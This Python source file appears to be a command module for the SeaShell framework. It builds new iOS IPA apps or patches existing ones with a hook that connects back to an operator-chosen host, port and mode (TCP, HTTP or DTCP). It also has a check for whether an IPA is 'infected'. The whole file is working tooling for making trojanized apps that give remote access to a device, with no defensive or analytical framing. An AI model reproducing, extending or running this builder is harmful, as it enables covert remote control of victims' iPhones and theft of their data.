"""
This command requires SeaShell: https://github.com/EntySec/SeaShell
Current source: https://github.com/EntySec/SeaShell
"""

from seashell.core.ipa import IPA
from seashell.core.hook import Hook

from seashell.core.device import (
    MODE_TCP,
    MODE_HTTP,
    MODE_DTCP
)

from pex.proto.tcp import TCPTools

from badges.cmd import Command


class ExternalCommand(Command):
    def __init__(self):
        super().__init__({
            'Category': "manage",
            'Name': "ipa",
            'Authors': [
                'Ivan Nikolskiy (enty8080) - command developer'
            ],
            'Description': "Manage IPA file generator.",
            'MinArgs': 1,
            'Options': [
                (
                    ('-c', '--check'),
                    {
                        'help': "Check if IPA file is infected.",
                        'metavar': 'FILE',
                    }
                ),
                (
                    ('-p', '--patch'),
                    {
                        'help': "Patch existing IPA file.",
                        'metavar': 'FILE'
                    }
                ),
                (
                    ('-b', '--build'),
                    {
                        'help': 'Build new IPA file.',
                        'action': 'store_true'
                    }
                )
            ]
        })

    def rpc(self, *args):
        if len(args) < 4:
            return

        if args[0] == 'patch':
            hook = Hook(args[2], args[3])
            hook.patch_ipa(args[1])

        elif args[0] == 'build':
            ipa = IPA(args[2], args[3])
            ipa.generate(args[1])

    def prompt_user(self):
        local_host = TCPTools.get_local_host()
        modes = [MODE_TCP, MODE_HTTP, MODE_DTCP]

        host = self.input_arrow(f"Host to connect back ({local_host}): ")
        host = host or local_host

        while True:
            mode = self.input_arrow(f"Mode to use for connection ({'|'.join(modes)}): ")
            mode = mode or MODE_TCP

            if mode in modes:
                break

            self.print_warning("Unsupported mode specified.")

        local_port = 8080 if mode == MODE_HTTP else 8888
        port = self.input_arrow(f"Port to connect back ({str(local_port)}): ")
        port = port or local_port

        return host, port, mode

    def run(self, args):
        if args.check:
            if IPA(None, None).check_ipa(args.check):
                self.print_information("IPA is built or patched.")
            else:
                self.print_information("IPA is original.")

        elif args.patch:
            if IPA(None, None).check_ipa(args.patch):
                self.print_warning("This IPA was already patched.")
                return

            hook = Hook(*self.prompt_user())
            hook.patch_ipa(args.patch)

            self.print_success(f"IPA at {args.patch} patched!")

        elif args.build:
            name = self.input_arrow("Application name (Mussel): ")
            bundle_id = self.input_arrow("Bundle ID (com.entysec.mussel): ")

            icon = self.input_question("Add application icon [y/N]: ")
            icon_path = None

            if icon.lower() in ['y', 'yes']:
                icon_path = self.input_arrow("Icon file path: ")

            path = self.input_arrow("Path to save the IPA: ")

            ipa = IPA(*self.prompt_user())
            ipa.set_name(name, bundle_id)

            if icon_path:
                ipa.set_icon(icon_path)

            self.print_success(f"IPA saved to {ipa.generate(path)}!")
